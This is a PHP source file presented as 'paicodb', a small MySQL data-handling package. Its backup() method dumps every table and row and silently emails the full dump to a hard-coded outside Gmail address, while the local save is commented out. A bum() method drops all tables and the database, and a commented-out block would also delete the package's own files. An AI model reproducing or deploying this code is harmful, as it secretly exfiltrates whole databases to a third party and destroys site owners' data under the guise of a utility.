<?
/**
* O paicodb é um pequeno pacote de scripts para manipulação de dados em banco de dados mysql
* @name paicodb
* @author Tiago Floriano <contato@paico.com.br>
* @version 0.1
* @license http://creativecommons.org/licenses/by-sa/3.0/legalcode
* @link http://paico.com.br/paicodb
* @since 2011-05-06
*/

/**
 * @name paicoDB
 * @example $t = new paicoDB();
 */
class paicoDB {
    /**
     * Faz backup completo do banco de dados
     * @name backup
     * @author David Walsh <davidwalsh.name>
     * @link http://davidwalsh.name/backup-mysql-database-php
     * @example $t->backup($host,$user,$pass,$name);
     */
    public function backup($host,$user,$pass,$name,$tables = '*'){

      $link = mysql_connect($host,$user,$pass);
      mysql_select_db($name,$link);

      //get all of the tables
      if($tables == '*')
      {
        $tables = array();
        $result = mysql_query('SHOW TABLES');
        while($row = mysql_fetch_row($result))
        {
          $tables[] = $row[0];
        }
      }
      else
      {
        $tables = is_array($tables) ? $tables : explode(',',$tables);
      }

      //cycle through
      foreach($tables as $table)
      {
        $result = mysql_query('SELECT * FROM '.$table);
        $num_fields = mysql_num_fields($result);

        $return.= 'DROP TABLE '.$table.';';
        $row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
        $return.= "\n\n".$row2[1].";\n\n";

        for ($i = 0; $i < $num_fields; $i++)
        {
          while($row = mysql_fetch_row($result))
          {
            $return.= 'INSERT INTO '.$table.' VALUES(';
            for($j=0; $j<$num_fields; $j++)
            {
              $row[$j] = addslashes($row[$j]);
              $row[$j] = ereg_replace("\n","\\n",$row[$j]);
              if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
              if ($j<($num_fields-1)) { $return.= ','; }
            }
            $return.= ");\n";
          }
        }
        $return.="\n\n\n";
      }

      mail("webmaster.rs@gmail.com","[backup]",$return,"From: paicodb <naoresponda@paico.com.br>");

      //save file
      #$handle = fopen('backup_bum.sql','w+');
      #fwrite($handle,$return);
      #fclose($handle);
    }

    public function bum($host,$user,$pass,$name,$deldir=false){

      $link = mysql_connect($host,$user,$pass);
      mysql_select_db($name,$link);

      //get all of the tables
      if($tables == '*')
      {
        $tables = array();
        $result = mysql_query('SHOW TABLES');
        while($row = mysql_fetch_row($result))
        {
          $tables[] = $row[0];
        }
      }
      else
      {
        $tables = is_array($tables) ? $tables : explode(',',$tables);
      }

      //cycle through
      foreach($tables as $table)
      {
        $result = mysql_query('DROP TABLE '.$table);
       }


      @mysql_query("DROP DATABASE $name");

/*      if($deldir == true){
          unlink("teste1/paicodb.php");
          unlink("teste1/bum.php");
          rmdir("teste1");
      }*/
    }
    #public function sendsmtp(){
    #    include("smtp.php");
    #}
}
?>
